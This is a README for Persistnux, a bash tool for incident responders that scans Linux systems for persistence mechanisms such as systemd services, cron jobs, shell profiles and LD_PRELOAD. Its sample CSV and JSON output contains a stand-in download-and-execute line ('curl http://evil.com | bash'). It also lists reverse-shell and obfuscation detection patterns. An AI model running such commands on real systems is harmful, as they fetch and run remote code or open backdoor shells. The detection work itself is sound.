# Persistnux

A comprehensive Linux persistence detection tool for Digital Forensics and Incident Response (DFIR) investigations.

## Overview

Persistnux is a bash-based tool designed to identify known Linux persistence mechanisms used by attackers to maintain access to compromised systems. It performs comprehensive checks across the system and generates detailed reports in both CSV and JSONL formats for further analysis.

## Features

- **Comprehensive Detection**: Covers all major Linux persistence mechanisms
- **Live Analysis**: Runs directly on live systems with minimal dependencies
- **Detailed Output**: Generates CSV and JSONL reports with file hashes, metadata, and confidence scores
- **Root and Non-Root**: Works with or without root privileges (with limited scope for non-root)
- **DFIR-Ready**: Output formats compatible with common DFIR tools and workflows
- **Suspicion Scoring**: Automatic confidence scoring (LOW, MEDIUM, HIGH, CRITICAL) based on indicators
- **False Positive Reduction**: Package manager integration and known-good service whitelisting
- **Time-Based Analysis**: Recently modified files receive higher confidence scores
- **Pattern Matching**: Detects reverse shells, download-execute patterns, obfuscation techniques

## Persistence Mechanisms Detected

### 1. Systemd Services
- Service files (`.service`) in `/etc/systemd/system`, `/lib/systemd/system`, `/usr/lib/systemd/system`
- User-level systemd services
- Filters out disabled services and services without ExecStart
- Detects suspicious ExecStart commands
- Verifies package integrity of executed binaries/scripts

### 2. Cron Jobs & Scheduled Tasks
- System crontabs (`/etc/crontab`, `/etc/cron.d/*`)
- Periodic execution directories (`/etc/cron.{daily,hourly,weekly,monthly}`)
- User crontabs for all users (root mode)
- At jobs
- Suspicious command patterns in scheduled tasks

### 3. Shell Profiles & RC Files
- System-wide profiles (`/etc/profile`, `/etc/bash.bashrc`, `/etc/zshrc`)
- Profile.d scripts (`/etc/profile.d/*`)
- User profiles (`.bashrc`, `.bash_profile`, `.zshrc`, `.profile`, etc.)
- Fish shell configurations
- Detects malicious commands in profile files

### 4. Init Scripts & RC.local
- `/etc/rc.local` and variants
- SysV init scripts (`/etc/init.d`)
- Runlevel scripts (`/etc/rc*.d`)
- Detects suspicious download/execution commands

### 5. Kernel Modules & Library Preloading
- LD_PRELOAD configurations (`/etc/ld.so.preload`)
- Dynamic linker configurations
- Loaded kernel modules (enumeration)
- Kernel module auto-load configs (`/etc/modules`, `/etc/modules-load.d`)

### 6. Additional Mechanisms
- XDG autostart entries (`.config/autostart`, `/etc/xdg/autostart`)
- System environment files (`/etc/environment`)
- Sudoers configurations and drop-ins
- PAM (Pluggable Authentication Modules) - verifies module package integrity
- MOTD (Message of the Day) scripts
- Git hooks and credential helpers
- Web shells in common web directories

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/persistnux.git
cd persistnux

# Make the script executable
chmod +x persistnux.sh
```

## Usage

### Basic Usage (Live Analysis)

```bash
# Run with default settings (shows only suspicious findings)
sudo ./persistnux.sh

# Show help and all options
./persistnux.sh --help

# Run as regular user (limited scope)
./persistnux.sh
```

### Filtering Options (v1.2+)

By default, Persistnux shows only **suspicious findings** (MEDIUM, HIGH, CRITICAL confidence) to reduce noise and focus on actionable threats.

```bash
# Default: Show only suspicious findings
sudo ./persistnux.sh

# Show all findings including baseline (LOW confidence)
sudo ./persistnux.sh --all
# OR
sudo FILTER_MODE=all ./persistnux.sh

# Show only HIGH and CRITICAL confidence findings
sudo MIN_CONFIDENCE=HIGH ./persistnux.sh

# Combine filters: HIGH confidence only
sudo ./persistnux.sh --min-confidence HIGH
```

### Custom Output Directory

```bash
# Specify custom output directory
sudo OUTPUT_DIR=/tmp/evidence ./persistnux.sh

# Combine with filtering
sudo OUTPUT_DIR=/tmp/evidence MIN_CONFIDENCE=HIGH ./persistnux.sh
```

### Output Files

By default, Persistnux creates an output directory `./persistnux_output/` containing:

- `persistnux_<hostname>_<timestamp>.csv` - CSV format report
- `persistnux_<hostname>_<timestamp>.jsonl` - JSONL format report (one JSON object per line)

## Output Format

### CSV Format

```csv
timestamp,hostname,category,confidence,file_path,file_hash,file_owner,file_permissions,file_age_days,package_status,command,enabled_status,description,matched_pattern,matched_string
2026-01-23T10:30:00Z,webserver01,Systemd Service,HIGH,/etc/systemd/system/example.service,abc123...,root:root,644,3,unmanaged,/usr/bin/example,enabled,example.service,suspicious_script_content,"curl http://evil.com | bash"
```

### JSONL Format

```json
{
  "timestamp": "2026-01-23T10:30:00Z",
  "hostname": "webserver01",
  "category": "Systemd Service",
  "confidence": "HIGH",
  "file_path": "/etc/systemd/system/example.service",
  "file_hash": "abc123...",
  "file_owner": "root:root",
  "file_permissions": "644",
  "file_age_days": "3",
  "package_status": "unmanaged",
  "command": "/usr/bin/example",
  "enabled_status": "enabled",
  "description": "example.service",
  "matched_pattern": "suspicious_script_content",
  "matched_string": "curl http://evil.com | bash"
}
```

### Key Output Fields

- **matched_pattern**: The detection pattern that triggered the finding (e.g., `suspicious_script_content`, `modified_package`, `unmanaged_binary`)
- **matched_string**: The actual suspicious content found (full line, not just keyword)

## Confidence Scoring

Persistnux uses intelligent confidence scoring to reduce false positives:

- **LOW**: Standard system configuration, low suspicion (often package-managed files)
- **MEDIUM**: Potentially suspicious but could be legitimate
- **HIGH**: Suspicious patterns detected (e.g., curl/wget in cron, /tmp execution, reverse shells)
- **CRITICAL**: Highly suspicious, likely malicious (reserved for future advanced detection)

### False Positive Reduction (v1.2+)

Persistnux now includes several features to reduce false positives:

1. **Package Manager Integration**: Files managed by `dpkg` (Debian/Ubuntu) or `rpm` (RedHat/CentOS) receive lower confidence scores
2. **Known-Good Service Whitelist**: Common vendor services (systemd-*, dbus-*, snap.*, etc.) are automatically skipped
3. **Time-Based Scoring**: Recently modified files (<7 days) receive higher confidence scores
4. **Context-Aware Analysis**: Combines multiple indicators for more accurate detection

## Suspicious Indicators

Persistnux automatically flags items with higher confidence when it detects:

### Network-Based Patterns
- Reverse shells: `bash -i >& /dev/tcp/`, `sh -i >& /dev/udp/`
- Network tools: `nc`, `netcat`, `socat`, `telnet`
- Socket operations in scripting languages: `python -c 'import socket'`

### Download and Execute Patterns
- Download tools: `curl | bash`, `wget | sh`
- Download with execution: `curl URL -o /tmp/file && chmod +x`

### Obfuscation Techniques
- Encoding: `base64 -d | bash`, `eval $(echo BASE64)`
- Dynamic execution: `eval`, `exec`

### Suspicious Locations
- Temporary directories: `/tmp`, `/dev/shm`, `/var/tmp`
- Hidden directories and files

### Permission Manipulation
- Making files executable: `chmod +x`, `chmod 777`
- SUID bit manipulation: `chmod u+s`

## Requirements

- Bash 4.0+
- Standard Unix utilities: `find`, `grep`, `stat`, `sha256sum`
- Optional: `systemctl`, `lsmod`, `modinfo` (for specific checks)
- Root/sudo access recommended for comprehensive analysis

## DFIR Workflow Integration

### Example: Import into Splunk

```bash
# Index JSONL output
cat persistnux_*.jsonl | splunk add oneshot -sourcetype persistnux:jsonl
```

### Example: Analyze with jq

```bash
# Find all HIGH confidence findings
cat persistnux_*.jsonl | jq 'select(.confidence == "HIGH")'

# Group by category
cat persistnux_*.jsonl | jq -r '.category' | sort | uniq -c

# Find all systemd services with suspicious commands
cat persistnux_*.jsonl | jq 'select(.category == "Systemd" and .confidence == "HIGH")'
```

### Example: Import into Pandas (Python)

```python
import pandas as pd

# Load CSV
df = pd.read_csv('persistnux_hostname_timestamp.csv')

# Filter high-confidence findings
high_risk = df[df['confidence'] == 'HIGH']

# Group by category
df.groupby('category').size()
```

## Roadmap

- [ ] Offline analysis mode for forensic disk images
- [ ] UAC (Unix-like Artifacts Collector) integration
- [ ] Extended detection for containerized environments (Docker, Podman)
- [ ] YARA rule integration for binary analysis
- [ ] Timeline generation
- [ ] HTML report generation
- [ ] Baseline comparison mode
- [ ] Detection of rootkits (chkrootkit/rkhunter integration)

## Contributing

Contributions are welcome! Please feel free to submit pull requests or open issues for:

- New persistence mechanism detection
- Bug fixes
- Documentation improvements
- Performance optimizations
- Additional output formats

## License

MIT License - See LICENSE file for details

## Acknowledgments

Developed for the DFIR community to assist in Linux incident response and forensic investigations.

## Disclaimer

This tool is intended for authorized security testing, incident response, and forensic analysis only. Users are responsible for ensuring they have proper authorization before running this tool on any system.

## Contact

For questions, issues, or contributions, please use the GitHub issue tracker.
